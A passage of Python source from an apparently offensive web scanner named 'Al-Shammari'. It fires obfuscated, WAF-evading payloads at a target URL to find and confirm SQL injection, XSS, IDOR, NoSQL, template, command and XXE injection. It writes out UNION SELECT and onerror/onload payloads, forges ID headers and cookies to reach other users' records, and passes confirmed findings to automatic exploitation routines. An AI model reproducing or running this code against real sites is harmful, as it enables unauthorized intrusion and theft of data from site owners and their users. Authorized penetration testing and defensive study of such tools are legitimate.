    return[n for p,n in ws if re.search(p,fl,re.IGNORECASE)]

def det_cms(ct):
    cs=[(r"wp-content","WordPress"),(r"wp-includes","WordPress"),(r"Joomla","Joomla"),(r"Drupal","Drupal"),(r"prestashop","PrestaShop"),(r"Magento","Magento"),(r"Shopify","Shopify"),(r"Laravel","Laravel"),(r"Django","Django")]
    return[n for p,n in cs if re.search(p,ct,re.IGNORECASE)]

def tpay(url,pl,method="GET",param=None):
    try:
        ob=st.obf(pl)
        if method=="GET":
            sp="&" if "?" in url else "?"
            if param:
                ps=urlparse(url); pq=parse_qs(ps.query); pq[param]=[ob]
                tu=f"{ps.scheme}://{ps.netloc}{ps.path}?{urllib.parse.urlencode(pq,doseq=True)}"
            else:
                tu=f"{url}{sp}{urllib.parse.urlencode({'payload':ob})}"
            tu=st.url_padding(tu)
            rs=req(tu)
        elif method=="POST":
            rs=req(url,method="POST",data={param:ob} if param else {"payload":ob})
        else:
            rs=req(url,method=method)
        if rs.get("e"): return None
        return{"pl":pl,"ob":ob,"s":rs["s"],"l":rs["l"],"t":rs["t"],"u":rs["u"],"c":rs["c"][:2000],"h":rs.get("h",{})}
    except: return None

def gbase(url,method="GET"): return req(url,method=method)
def eparams(url): return list(parse_qs(urlparse(url).query).keys())

def multi_baseline(url,method="GET",samples=3):
    bss=[]
    for _ in range(samples):
        r=req(url,method=method,stealth=False)
        if r and not r.get("e"):
            bss.append({"s":r["s"],"l":r["l"],"t":r["t"],"c":r["c"],
                        "hash":content_hash(r["c"]),
                        "tags":extract_structure(r["c"])})
    if not bss: return None
    avg_l=sum(b["l"] for b in bss)/len(bss)
    avg_t=sum(b["t"] for b in bss)/len(bss)
    std_t=(sum((b["t"]-avg_t)**2 for b in bss)/len(bss))**0.5
    std_l=(sum((b["l"]-avg_l)**2 for b in bss)/len(bss))**0.5
    max_l=max(b["l"] for b in bss)
    min_l=min(b["l"] for b in bss)
    spread=max_l-min_l
    hashes=[b["hash"] for b in bss]
    mode_hash=max(set(hashes),key=hashes.count)
    return{"avg_l":avg_l,"avg_t":avg_t,"std_t":std_t,"std_l":std_l,
           "spread":spread,"max_l":max_l,"min_l":min_l,
           "samples":bss,"hash":mode_hash,
           "tags":bss[0]["tags"],"content":bss[0]["c"]}

def bool_verify(url,true_pl,false_pl,method="GET",param=None):
    tr=tpay(url,true_pl,method,param)
    fr=tpay(url,false_pl,method,param)
    if not tr or not fr: return None
    diff={}
    diff["len_diff"]=abs(tr["l"]-fr["l"])
    diff["status_diff"]=tr["s"]!=fr["s"]
    diff["true_hash"]=content_hash(tr["c"])
    diff["false_hash"]=content_hash(fr["c"])
    diff["hash_diff"]=diff["true_hash"]!=diff["false_hash"]
    tt=extract_structure(tr["c"]); ft=extract_structure(fr["c"])
    diff["tag_diff"]=len(set(tt[0])-set(ft[0]))
    true_err=len(det_err(tr["c"]))>0
    false_err=len(det_err(fr["c"]))>0
    diff["err_diff"]=true_err!=false_err
    score=0
    if diff["len_diff"]>50: score+=2
    if diff["len_diff"]>200: score+=2
    if diff["hash_diff"]: score+=3
    if diff["status_diff"]: score+=2
    if diff["tag_diff"]>3: score+=2
    if diff["err_diff"]: score+=1
    confirmed=score>=4
    if diff["len_diff"]<30 and not diff["status_diff"] and not diff["err_diff"]:
        confirmed=False
    return{"score":score,"confirmed":confirmed,"diff":diff,"true":tr,"false":fr}

def time_verify(url,sleep_pl,base_time,base_std,method="GET",param=None,samples=3):
    times=[]
    for _ in range(samples):
        r=tpay(url,sleep_pl,method,param)
        if r: times.append(r["t"])
    if not times: return None
    avg_t=sum(times)/len(times)
    min_t=min(times)
    std_t=(sum((t-avg_t)**2 for t in times)/len(times))**0.5
    threshold=base_time+base_std*3+2
    confirmed=avg_t>=threshold and min_t>=base_time+2
    if std_t>1.0 and (max(times)-min_t)>2 and min_t<threshold:
        confirmed=False
    return{"avg":avg_t,"min":min_t,"max":max(times),"std":std_t,
           "samples":times,"threshold":threshold,
           "confirmed":confirmed,
           "deviation":(avg_t-base_time)/max(base_std,0.1)}

def union_verify(url,payloads,method="GET",param=None):
    markers=["ALSHAMMARI_TEST","{{UNION_PROOF}}","42d7f8a1b3c9",
             "UNION_MARKER_918273","alshammari_poc"]
    for marker in markers:
        for i in range(1,10):
            cols=",".join([f"'{marker}'" if j==1 else "NULL" for j in range(i)])
            pl=f"' UNION SELECT {cols} --"
            r=tpay(url,pl,method,param)
            if r and marker in r["c"]:
                ctx=r["c"][max(0,r["c"].find(marker)-100):r["c"].find(marker)+len(marker)+100]
                return{"confirmed":True,"columns":i,"marker":marker,
                       "context":ctx[:200],"payload":pl}
    return{"confirmed":False}

def xss_context(ct,payload):
    contexts=[]
    idx=ct.find(payload)
    if idx==-1:
        for enc in [urllib.parse.quote(payload),urllib.parse.quote(payload,safe=""),
                    payload.replace("<","&lt;").replace(">","&gt;")]:
            idx=ct.find(enc)
            if idx!=-1: break
    if idx==-1: return contexts
    before=ct[:idx]
    if re.search(r'<script[^>]*>[^<]*$',before):
        contexts.append({"type":"javascript","safe":True,
                         "desc":"Inside <script> tag - direct JS execution"})
    if re.search(r'<script[^>]*>\s*$',before,re.IGNORECASE):
        contexts.append({"type":"script-injection","safe":True,
                         "desc":"Direct injection into <script> tag"})
    tag_match=re.findall(r'<(\w+)\s+[^>]*$',before)
    if tag_match:
        tag=tag_match[-1]
        attr_match=re.findall(r'(\w+)=(?:"[^"]*|\'[^\']*)$',before)
        if attr_match:
            attr=attr_match[-1].lower()
            if attr in ["href","src","action","formaction","data","poster",
                        "background","xlink:href"]:
                contexts.append({"type":"url-attr","safe":True,
                                 "desc":f"Inside URL attribute of <{tag}> ({attr})"})
            elif attr in ["style","class","id"]:
                contexts.append({"type":"safe-attr","safe":False,
                                 "desc":f"Inside {attr} attribute of <{tag}>"})
            else:
                contexts.append({"type":"attr","safe":True,
                                 "desc":f"Inside {attr} attribute of <{tag}>"})
        else:
            contexts.append({"type":"tag-open","safe":True,
                             "desc":f"Inside opening <{tag}> tag"})
    if not tag_match:
        prev_close=before.rfind(">")
        prev_open=before.rfind("<",max(0,prev_close))
        if prev_close>prev_open or prev_open==-1:
            contexts.append({"type":"html-body","safe":True,
                             "desc":"Reflected in HTML body between tags"})
    if re.search(r'javascript:[^"\']*$',before):
        contexts.append({"type":"javascript-uri","safe":True,
                         "desc":"Inside javascript: URI"})
    if re.search(r'=\s*"[^"]*$',before) or re.search(r"=\s*'[^']*$",before):
        if not any(c["type"]=="attr" for c in contexts):
            contexts.append({"type":"attr-value","safe":True,
                             "desc":"Inside quoted attribute value"})
    if re.search(r'on\w+\s*=\s*"[^"]*$',before,re.IGNORECASE):
        contexts.append({"type":"event-handler","safe":True,
                         "desc":"Inside event handler attribute"})
    if re.search(r'style\s*=\s*"[^"]*$',before,re.IGNORECASE):
        contexts.append({"type":"style-attr","safe":True,
                         "desc":"Inside style attribute"})
    if not contexts:
        contexts.append({"type":"unknown","safe":False,
                         "desc":"Reflected but context unclear"})
    return contexts

def xss_multi_verify(url,original_payload,method="GET",param=None):
    proofs=[]
    unique_tag=f"xss{random.randint(10000,99999)}"
    unique_val=f"alshammari{random.randint(100000,999999)}"
    safe_pl=f"<img src=x onerror=alert('{unique_val}')>"
    safe_pl2=f"<svg onload=alert('{unique_val}')>"
    safe_pl3=f"<div id='{unique_tag}'>test</div>"
    for pl in [safe_pl,safe_pl2,safe_pl3]:
        r=tpay(url,pl,method,param)
        if r and unique_val in r["c"]:
            ctxs=xss_context(r["c"],unique_val)
            if any(c["safe"] for c in ctxs):
                proofs.append({"method":"direct-reflection","payload":pl,
                               "context":ctxs,"evidence":unique_val in r["c"]})
                break
    encoded_payloads=[
        urllib.parse.quote(original_payload),
        urllib.parse.quote(original_payload,safe=""),
        original_payload.replace("<","%3C").replace(">","%3E"),
        original_payload.replace("<","\\u003c").replace(">","\\u003e"),
        original_payload.replace("alert","\\u0061lert"),
        original_payload.replace("<","&lt;").replace(">","&gt;"),
    ]
    for ep in encoded_payloads:
        r=tpay(url,ep,method,param)
        if r and (unique_val in r["c"] or "alert" in r["c"]):
            proofs.append({"method":"encoding-bypass","payload":ep,
                           "encoded":True})
            break
    dom_sinks=["document.write","innerHTML","outerHTML","insertAdjacentHTML",
               "eval(","setTimeout(","setInterval(","location=",
               "location.href","location.replace","location.assign",
               ".src =",".href =",".action =",".formAction =",
               "$(","jQuery(","angular.element","React.createElement",
               "document.domain","document.URL","document.referrer",
               "window.name","location.search","location.hash",
               "postMessage","window.open"]
    for sink in dom_sinks:
        test_pl=f"<test_{unique_tag}>{sink}</test>"
        r=tpay(url,test_pl,method,param)
        if r and f"test_{unique_tag}" in r["c"] and sink in r["c"]:
            proofs.append({"method":"dom-sink","sink":sink,
                           "evidence":f"Input flows to {sink}"})
            break
    return proofs

def auth_verify(url,login_data,resp,original_cookies):
    proofs=[]
    cl=resp["c"].lower()
    post_cookies=st.all_cookies()
    new_cookies={k:v for k,v in post_cookies.items() if k not in original_cookies or original_cookies[k]!=v}
    success_kw=["welcome","dashboard","logout","profile","admin","panel",
                "control","manage","home","account","settings","overview",
                "my-account","user","member","portal","backend","console",
                "administration","successful","logged in","signed in",
                "hi ","hello ","dear ","good ","menu","sidebar",
                "notification","inbox","message","upload"]
    fail_kw=["login","sign in","incorrect","invalid","failed","wrong",
             "error","unauthorized","denied","wrong password","not found",
             "does not exist","no account","disabled","locked","expired",
             "try again","register","sign up","create account","forgot",
             "reset password","captcha","verification"]
    success_hits=sum(1 for w in success_kw if w in cl)
    fail_hits=sum(1 for w in fail_kw if w in cl)
    if success_hits>fail_hits and success_hits>=2:
        proofs.append({"method":"keyword-analysis","score":f"{success_hits}vs{fail_hits}",
                       "evidence":"Response contains success indicators"})
    if new_cookies:
        auth_cookies=[k for k in new_cookies if any(x in k.lower() for x in
                      ["session","token","auth","login","user","sid","jwt","connect"]) ]
        if auth_cookies:
            proofs.append({"method":"session-token","cookies":auth_cookies,
                           "evidence":"New auth cookies issued"})
    redirect_url=resp["h"].get("Location","")
    if redirect_url:
        red_l=redirect_url.lower()
        bad_red=["login","signin","auth","error","failed"]
        good_red=["dashboard","home","panel","profile","account","admin","welcome"]
        if any(g in red_l for g in good_red) and not any(b in red_l for b in bad_red):
            proofs.append({"method":"redirect-chain","url":redirect_url,
                           "evidence":"Redirect to authenticated area"})
    if resp["s"]==302:
        proofs.append({"method":"status-redirect","evidence":"302 redirect issued"})
    if len(resp["c"])>1000 and success_hits>fail_hits:
        proofs.append({"method":"content-size","size":len(resp["c"]),
                       "evidence":"Substantial response with success indicators"})
    ps=urlparse(url)
    base=f"{ps.scheme}://{ps.netloc}"
    protected=["/dashboard","/admin","/profile","/account","/api/user",
               "/api/me","/home","/panel","/manage","/settings"]
    if new_cookies:
        for ep in random.sample(protected,min(3,len(protected))):
            pr=req(base+ep)
            if pr and not pr.get("e") and pr["s"]==200 and len(pr["c"])>500:
                if not is_error_page(pr["c"],pr["s"]):
                    proofs.append({"method":"post-auth-access","endpoint":ep,
                                   "evidence":"Can access protected resource after bypass"})
                    break
    return proofs

def det_extra(group,category,payload,resp,baseline=None):
    if not resp or resp.get("e"): return []
    ct=resp.get("c","")
    cl=ct.lower()
    proofs=[]
    base_len=baseline.get("avg_l",0) if baseline else 0
    len_diff=abs(resp.get("l",0)-base_len) if baseline else 0
    hash_diff=content_hash(ct)!=(baseline.get("hash","") if baseline else "")

    if group=="NOSQL":
        nosql_err=["mongodb","mongoerror","bson","objectid","casterror","mongoose",
                   "e11000","not master","errmsg","$where","syntaxerror"]
        if any(x in cl for x in nosql_err):
            proofs.append({"method":"nosql-error","evidence":"NoSQL/MongoDB error signature detected"})
        if baseline and hash_diff and len_diff>80 and resp.get("s") in [200,302,301]:
            proofs.append({"method":"nosql-behavior","evidence":f"Response changed after NoSQL operator injection (diff={len_diff:.0f})"})

    elif group=="SSTI":
        if "49" in ct and any(x in payload for x in ["7*7","${7*7}","<%= 7*7 %>"]):
            proofs.append({"method":"ssti-eval","evidence":"Template expression evaluated to 49"})
        ssti_sigs=["<class '", "subclasses", "config", "jinja", "freemarker", "velocity", "twig", "request object"]
        if any(x in cl for x in ssti_sigs):
            proofs.append({"method":"ssti-disclosure","evidence":"Template engine object/error leaked"})
        if any(x in cl for x in ["uid=", "gid=", "root:", "www-data", "apache", "nginx"]):
            proofs.append({"method":"ssti-rce","evidence":"Command output or system file content found"})

    elif group=="CMDI":
        cmd_sigs=["uid=", "gid=", "groups=", "root:", "bin/bash", "windows", "volume serial",
                  "directory of", "administrator", "nt authority", "www-data", "apache", "nginx"]
        if any(x in cl for x in cmd_sigs):
            proofs.append({"method":"cmd-output","evidence":"Command output signature detected"})
        if resp.get("t",0)>=3 and any(x in payload.lower() for x in ["sleep", "ping -n"]):
            proofs.append({"method":"cmd-time","evidence":f"Time delay observed ({resp.get('t',0):.2f}s)"})

    elif group=="XXE":
        xxe_sigs=["root:x:", "daemon:x:", "[extensions]", "for 16-bit app support",
                  "xml parsing", "external entity", "doctype", "entity"]
        if any(x in cl for x in xxe_sigs):
            proofs.append({"method":"xxe-file-or-error","evidence":"XXE file disclosure or parser error signature detected"})
        if baseline and hash_diff and len_diff>100:
            proofs.append({"method":"xxe-behavior","evidence":f"XML entity payload changed response (diff={len_diff:.0f})"})

    return proofs

def s_extra(url,method="GET",param=None):
    rs=[]
    inf(f"Scanning Extra Injection Payloads on: {C.BO}{url}{C.X}")
    print(f"{C.D}{'─'*70}{C.X}")
    baseline=multi_baseline(url,method,2)
    groups=[("NOSQL",NOSQL),("SSTI",SSTI),("CMDI",CMDI),("XXE",XXE)]
    total=sum(len(items) for _,db in groups for items in db.values())
    cnt=0
    for group,db in groups:
        for category,payloads in db.items():
            inf(f"  Testing {group}/{category}...")
            for pl in payloads:
                cnt+=1
                print(f"\r{C.D}    [{cnt}/{total}] {group}/{category}...{C.X}",end="",flush=True)
                r=tpay(url,pl,method,param)
                proofs=det_extra(group,category,pl,r,baseline)
                if proofs:
                    sev="critical" if any(p["method"] in ["ssti-rce","cmd-output","xxe-file-or-error"] for p in proofs) else "high"
                    vln(f"  {group}/{category}: {C.Y}{pl[:55]}{C.X}")
                    for p in proofs:
                        inf(f"    Proof [{p['method']}]: {C.M}{p['evidence']}{C.X}")
                    rs.append({"type":f"{group} Injection ({category})","severity":sev,
                               "param":param or "N/A","payload":pl[:80],
                               "status":r.get("s","") if r else "","proofs":proofs})
    print(f"\r{' '*70}\r",end="")
    return rs

def sc(sev):
    return{"critical":C.R,"high":C.R,"medium":C.Y,"low":C.G,"info":C.CY}.get(sev,C.W)

def ptable(hdrs,rows,wids):
    bd="+"+"+".join("-"*w for w in wids)+"+"
    print(f"{C.D}{bd}{C.X}")
    hd="|"+"|".join(f"{C.BO}{C.CY} {h:<{w-1}}{C.X}" for h,w in zip(hdrs,wids))+"|"
    print(hd); print(f"{C.D}{bd}{C.X}")
    for row in rows:
        ln="|"
        for cell,w in zip(row,wids):
            cl=cell[1] if isinstance(cell,tuple) else C.W
            tx=cell[0] if isinstance(cell,tuple) else str(cell)
            ln+=f"{cl} {tx:<{w-1}}{C.X}|"
        print(ln)
    print(f"{C.D}{bd}{C.X}")

def pres(results):
    if not results:
        print(f"\n{C.G}  No vulnerabilities found.{C.X}\n"); return
    print(f"\n{C.BO}{C.R}{'█'*80}{C.X}")
    print(f"{C.BO}{C.R}{'█'*80}{C.X}")
    print(f"{C.BO}{C.W}  ╔══════════════════════════════════════════════════════════════════════╗")
    print(f"{C.BO}{C.W}  ║              {C.G}SCAN RESULTS - Al-Shammari{C.W}                   ║")
    print(f"{C.BO}{C.W}  ╚══════════════════════════════════════════════════════════════════════╝{C.X}")
    print(f"{C.BO}{C.R}{'█'*80}{C.X}")
    print(f"{C.BO}{C.R}{'█'*80}{C.X}\n")
    hd=["#","Type","Severity","Parameter","Payload","Status"]
    rows=[]
    for i,r in enumerate(results,1):
        sv=r.get("severity","info")
        rows.append([str(i),r.get("type","unknown"),(sv.upper(),sc(sv)),r.get("param","N/A")[:20],r.get("payload","N/A")[:45],str(r.get("status",""))])
    ptable(hd,rows,[4,18,12,22,47,8])
    for i,r in enumerate(results,1):
        proofs=r.get("proofs",[])
        if proofs:
            sv=r.get("severity","info")
            print(f"\n  {sc(sv)}{C.BO}#{i} Proof of Concept:{C.X}")
            for j,p in enumerate(proofs,1):
                method=p.get("method","unknown")
                evidence=p.get("evidence","")
                print(f"    {C.Y}{j}.{C.X} {C.CY}[{method}]{C.X} {evidence}")
                if "db" in p:
                    print(f"       DB: {C.M}{', '.join(p['db'])}{C.X}")
                if "context" in r:
                    print(f"       Context: {C.M}{r['context']}{C.X}")
                if "score" in p:
                    print(f"       Confidence: {C.G}{p['score']}/10{C.X}")
    cr=sum(1 for r in results if r.get("severity")=="critical")
    hi=sum(1 for r in results if r.get("severity")=="high")
    me=sum(1 for r in results if r.get("severity")=="medium")
    lo=sum(1 for r in results if r.get("severity")=="low")
    verified=sum(1 for r in results if len(r.get("proofs",[]))>=2)
    print(f"\n{C.BO}  Summary:{C.X}")
    print(f"  {C.R}Critical: {cr}{C.X}  {C.R}High: {hi}{C.X}  {C.Y}Medium: {me}{C.X}  {C.G}Low: {lo}{C.X}  {C.BO}Total: {len(results)}{C.X}  {C.G}Verified: {verified}{C.X}\n")

def s_sqli(url,method="GET",param=None):
    rs=[]
    inf(f"Scanning SQLi on: {C.BO}{url}{C.X}")
    print(f"{C.D}{'─'*70}{C.X}")
    bl=multi_baseline(url,method,3)
    if not bl:
        err("  Cannot establish baseline"); return rs
    inf(f"  Baseline: {bl['avg_l']:.0f} bytes | {bl['avg_t']:.2f}s (±{bl['std_t']:.2f})")
    confirmed_payloads=set()
    sts=[("error-based",SQLI["error"]),("basic",SQLI["basic"]),
         ("union-based",SQLI["union"]),("time-based",SQLI["time"]),
         ("blind",SQLI["blind"]),("waf-bypass",SQLI["waf"]),
         ("polyglot",SQLI["polyglot"]),("stacked",SQLI["stacked"]),
         ("json-sqli",SQLI["json"]),("second-order",SQLI["second_order"]),
         ("oob",SQLI["oob"]),("graphql",SQLI["graphql"]),
         ("jwt",SQLI["jwt"]),("lfi",SQLI["lfi"])]
    tot=sum(len(p) for _,p in sts); cnt=0
    for vt,pls in sts:
        inf(f"  Testing {vt}...")
        for pl in pls:
            cnt+=1
            print(f"\r{C.D}    [{cnt}/{tot}] {vt}...{C.X}",end="",flush=True)
            r=tpay(url,pl,method,param)
            if not r: continue
            er=det_err(r["c"])
            proofs=[]
            vuln=False
            if er:
                db=list(set(e["d"] for e in er))
                proofs.append({"method":"error-based","db":db,
                               "evidence":f"{len(er)} error patterns matched"})
                bv=bool_verify(url,
                    "' AND '1'='1",
                    "' AND '1'='2",method,param)
                if bv and bv["confirmed"]:
                    proofs.append({"method":"boolean-verify","score":bv["score"],
                        "evidence":f"TRUE/FALSE diff: len={bv['diff']['len_diff']}, hash={bv['diff']['hash_diff']}"})
                vuln=True
            elif "time" in vt:
                tv=time_verify(url,pl,bl["avg_t"],bl["std_t"],method,param,3)
                if tv and tv["confirmed"]:
                    proofs.append({"method":"statistical-timing","avg":f"{tv['avg']:.2f}s",
                        "deviation":f"{tv['deviation']:.1f}σ",
                        "evidence":f"avg={tv['avg']:.2f}s vs base={bl['avg_t']:.2f}s"})
                    vuln=True
            elif "blind" in vt or "basic" in vt:
                rhash=content_hash(r["c"])
                rtags=extract_structure(r["c"])
                len_diff=abs(r["l"]-bl["avg_l"])
                tag_diff=len(set(rtags[0])-set(bl["tags"][0]))
                spread=bl.get("spread",0)
                noise_margin=max(spread*1.5,30)
                if rhash!=bl["hash"] and len_diff>100 and len_diff>noise_margin and not is_error_page(r["c"],r["s"]):
                    bv=bool_verify(url,"' AND '1'='1","' AND '1'='2",method,param)
                    if bv and bv["confirmed"]:
                        proofs.append({"method":"boolean-verify","score":bv["score"],
                            "evidence":f"hash+bool (score={bv['score']})"})
                        vuln=True
                    elif len_diff>200 and len_diff>noise_margin*1.5 or tag_diff>5:
                        proofs.append({"method":"content-diff","len_diff":len_diff,
                            "evidence":f"len={len_diff}, tags={tag_diff}, spread={spread}"})
                        vuln=True
            if vuln and proofs:
                confirmed_payloads.add(pl)
                all_db=sum([p.get("db",[]) for p in proofs if "db" in p],[])
                vln(f"  {vt}: {C.Y}{pl[:50]}{C.X}")
                for p in proofs:
                    inf(f"    Proof [{p['method']}]: {C.M}{p['evidence']}{C.X}")
                sv="critical" if any("union" in p["method"] or "error" in p["method"] or "boolean" in p["method"] for p in proofs) else "high"
                rs.append({"type":f"SQLi ({vt})","severity":sv,
                           "param":param or "N/A","payload":pl,"status":r["s"],
                           "db":all_db,"proofs":proofs})
    print(f"\r{' '*70}\r",end="")
    if rs:
        seen=set()
        deduped=[]
        for r in rs:
            sig=(r["type"],r.get("severity"))
            if sig in seen: continue
            seen.add(sig)
            deduped.append(r)
        rs=deduped
        inf("  Union verification...")
        uv=union_verify(url,[],method,param)
        if uv["confirmed"]:
            vln(f"  Union confirmed: {uv['columns']} cols, marker found")
            rs.append({"type":"SQLi (union-verified)","severity":"critical",
                       "param":param or "N/A","payload":uv.get("payload",""),
                       "status":200,"proofs":[{"method":"union-marker",
                       "evidence":f"marker={uv['marker']}, cols={uv['columns']}"}]})
        inf(f"  {C.R}Exploiting SQLi...{C.X}")
        exp_data=exp_sqli(url,method,param,rs)
        for r in rs: r["exploit"]=exp_data
    return rs

def s_xss(url,method="GET",param=None):
    rs=[]
    inf(f"Scanning XSS on: {C.BO}{url}{C.X}")
    print(f"{C.D}{'─'*70}{C.X}")
    sts=[("reflected",XSS["reflected"]),("events",XSS["events"]),
         ("waf-bypass",XSS["waf"]),("dom",XSS["dom"]),
         ("polyglot",XSS["polyglot"]),("svg",XSS["svg"]),
         ("csp-bypass",XSS["csp"]),("framework",XSS["framework"]),
         ("mutation",XSS["mutation"]),("import",XSS["import"])]
    tot=sum(len(p) for _,p in sts); cnt=0
    for sn,pls in sts:
        inf(f"  Testing {sn}...")
        for pl in pls:
            cnt+=1
            print(f"\r{C.D}    [{cnt}/{tot}] {sn}...{C.X}",end="",flush=True)
            r=tpay(url,pl,method,param)
            if not r: continue
            xf=det_xss(r["c"],pl)
            if xf:
                ctxs=xss_context(r["c"],pl)
                safe_ctxs=[c for c in ctxs if c["safe"]]
                if safe_ctxs:
                    proofs=[]
                    proofs.append({"method":"reflection","evidence":
                        f"Payload reflected in {safe_ctxs[0]['type']} context: {safe_ctxs[0]['desc']}"})
                    multi=xss_multi_verify(url,pl,method,param)
                    for m in multi:
                        proofs.append({"method":m["method"],
                            "evidence":m.get("evidence",m.get("sink","Verified via "+m["method"]))})
                    vln(f"  {sn}: {C.Y}{pl[:50]}{C.X}")
                    for p in proofs:
                        inf(f"    Proof [{p['method']}]: {C.M}{p['evidence']}{C.X}")
                    sv="critical" if any("document.cookie" in str(p) or "session" in str(p) for p in proofs) else \
                       "high" if safe_ctxs else "medium"
                    rs.append({"type":f"XSS ({sn})","severity":sv,
                               "param":param or "N/A","payload":pl[:60],
                               "status":r["s"],"proofs":proofs,
                               "context":safe_ctxs[0]["type"]})
                else:
                    pc=re.sub(r'[<>"\'=;/\\]','',pl)
                    if pc and len(pc)>3 and pc[:15] in r["c"]:
                        proofs=[{"method":"partial-reflection",
                                 "evidence":"Payload partially reflected (sanitized but present)"}]
                        vln(f"  {sn} (partial): {C.Y}{pl[:50]}{C.X}")
                        for p in proofs:
                            inf(f"    Proof [{p['method']}]: {C.M}{p['evidence']}{C.X}")
                        rs.append({"type":f"XSS ({sn}, partial)","severity":"medium",
                                   "param":param or "N/A","payload":pl[:60],
                                   "status":r["s"],"proofs":proofs,"context":"sanitized"})
    print(f"\r{' '*70}\r",end="")
    if rs:
        inf(f"  {C.R}Exploiting XSS...{C.X}")
        exp_data=exp_xss(url,method,param,rs)
        for r in rs: r["exploit"]=exp_data
    return rs

def s_idor(url,method="GET"):
    rs=[]
    inf(f"Scanning IDOR on: {C.BO}{url}{C.X}")
    print(f"{C.D}{'─'*70}{C.X}")
    ps=urlparse(url)
    pq=parse_qs(ps.query)

    br=req(url,stealth=False)
    if br.get("e"):
        err(f"  Cannot reach target: {br['e']}")
        return rs
    bhash=content_hash(br["c"])
    btags,battrs=extract_structure(br["c"])
    blen=br["l"]
    berr=is_error_page(br["c"],br["s"])
    binf=is_data_page(br["c"],br["s"])
    inf(f"  Baseline: {blen} bytes | hash={bhash[:8]}... | error={berr} | data={binf}")

    def check_idor(test_url,label,test_resp,sev_base="high",extra=""):
        if test_resp.get("e"): return
        thash=content_hash(test_resp["c"])
        ttags,tattrs=extract_structure(test_resp["c"])
        terr=is_error_page(test_resp["c"],test_resp["s"])
        tinf=is_data_page(test_resp["c"],test_resp["s"])
        sim=similarity(br["c"],test_resp["c"])
        diff_len=abs(test_resp["l"]-blen)
        new_tags=set(ttags)-set(btags)
        new_attrs=set(tattrs)-set(battrs)
        vuln=False
        reasons=[]
        if thash!=bhash and not terr and tinf:
            vuln=True; reasons.append("different content hash + data detected")
        if sim<0.8 and tinf and not terr:
            vuln=True; reasons.append(f"low similarity ({sim:.0%}) + data page")
        if diff_len>200 and test_resp["s"]==200 and not terr and tinf:
            vuln=True; reasons.append(f"significant length diff ({diff_len})")
        if len(new_tags)>5 and not terr:
            vuln=True; reasons.append(f"new HTML structure ({len(new_tags)} new tags)")
        if test_resp["s"]==200 and berr and tinf:
            vuln=True; reasons.append("base=error, test=data")
        if test_resp["s"]==200 and test_resp["l"]>blen*1.5 and not terr:
            vuln=True; reasons.append(f"response much larger ({test_resp['l']} vs {blen})")
        if len(new_attrs)>3 and "token" not in " ".join(new_attrs).lower():
            vuln=True; reasons.append(f"new attributes detected ({len(new_attrs)})")
        if vuln:
            sev="critical" if tinf and (diff_len>500 or len(new_tags)>10) else sev_base
            vln(f"  IDOR {label}: {C.Y}{extra}{C.X}")
            for r in reasons:
                inf(f"    Reason: {C.M}{r}{C.X}")
            inf(f"    Status: {test_resp['s']} | Length: {test_resp['l']} | Sim: {sim:.0%} | Hash: {thash[:8]}...")
            rs.append({"type":"IDOR","severity":sev,"param":label,
                       "payload":test_url if len(test_url)<200 else test_url[:200],
                       "status":test_resp["s"]})

    # 1. Query parameter IDOR
    ip=[k for k in pq if any(x in k.lower() for x in IDOR_NAMES)]
    if not ip:
        ip=list(pq.keys())
    for ip2 in ip:
        inf(f"  Testing param: {C.BO}{ip2}{C.X}")
        ov=pq[ip2][0] if ip2 in pq else None
        tids=gen_test_ids(ov)
        for v in tids:
            if ov and v==ov: continue
            tp=dict(pq); tp[ip2]=[v]
            tu=f"{ps.scheme}://{ps.netloc}{ps.path}?{urllib.parse.urlencode(tp,doseq=True)}"
            rr=req(tu)
            check_idor(tu,f"param[{ip2}]={v}",rr,extra=f"{ip2}={v}")
        if ov:
            for enc_v in gen_encoded(ov)[:3]:
                tp=dict(pq); tp[ip2]=[enc_v]
                tu=f"{ps.scheme}://{ps.netloc}{ps.path}?{urllib.parse.urlencode(tp,doseq=True)}"
                rr=req(tu)
                check_idor(tu,f"param[{ip2}][encoded]",rr,extra=f"{ip2}={enc_v[:30]}")

    # 2. Path-based IDOR (numeric IDs in URL)
    for m in PATH_ID_RE.finditer(ps.path):
        orig_val=m.group(1)
        inf(f"  Testing path ID: {C.BO}{orig_val}{C.X}")
        for nv in gen_test_ids(orig_val):
            if nv==orig_val: continue
            np=ps.path.replace(f"/{orig_val}",f"/{nv}",1)
            tu=f"{ps.scheme}://{ps.netloc}{np}"
            if ps.query: tu+=f"?{ps.query}"
            rr=req(tu)
            check_idor(tu,f"path[{orig_val}]={nv}",rr,extra=f"/{nv}")

    # 3. Path-based IDOR (UUID in URL)
    for m in PATH_UUID_RE.finditer(ps.path):
        orig_uuid=m.group(1)
        inf(f"  Testing path UUID: {C.BO}{orig_uuid[:8]}...{C.X}")
        for nu in gen_test_uuids(orig_uuid):
            np=ps.path.replace(f"/{orig_uuid}",f"/{nu}",1)
            tu=f"{ps.scheme}://{ps.netloc}{np}"
            if ps.query: tu+=f"?{ps.query}"
            rr=req(tu)
            check_idor(tu,"path[UUID]",rr,extra=f"/{nu[:8]}...")

    # 4. Path-based IDOR (hash/token in URL)
    for m in PATH_HASH_RE.finditer(ps.path):
        orig_hash=m.group(1)
        inf(f"  Testing path hash: {C.BO}{orig_hash[:16]}...{C.X}")
        for _ in range(5):
            fake_h=hashlib.sha256(str(random.randint(0,999999)).encode()).hexdigest()[:len(orig_hash)]
            np=ps.path.replace(f"/{orig_hash}",f"/{fake_h}",1)
            tu=f"{ps.scheme}://{ps.netloc}{np}"
            if ps.query: tu+=f"?{ps.query}"
            rr=req(tu)
            check_idor(tu,"path[hash]",rr,extra=f"/{fake_h[:16]}...")

    # 5. Header-based IDOR
    inf("  Testing header-based IDOR...")
    test_ids_hdr=["1","2","0","999","1337","100"]
    for hname in IDOR_HEADERS:
        for tid in test_ids_hdr:
            hh=dict(st.hdrs)
            hh[hname]=tid
            old_hdrs=st.hdrs
            st.hdrs=hh
            rr=req(url)
            st.hdrs=old_hdrs
            check_idor(url,f"header[{hname}]={tid}",rr,extra=f"{hname}: {tid}")

    # 6. Cookie-based IDOR
    inf("  Testing cookie-based IDOR...")
    cookie_id_names=["user_id","uid","session_user","userid","account_id","member_id",
                     "customer_id","client_id","profile_id","admin_id","logged_in_id",
                     "auth_id","identity","user","id","current_user"]
    for cn in cookie_id_names:
        for tid in ["1","2","0","999","1337"]:
            old_ck=dict(st.cookies)
            st.cookies[cn]=tid
            rr=req(url)
            st.cookies=old_ck
            check_idor(url,f"cookie[{cn}]={tid}",rr,extra=f"Cookie: {cn}={tid}")

    # 7. API endpoint probing
    api_paths=detect_api_paths(url)
    if api_paths:
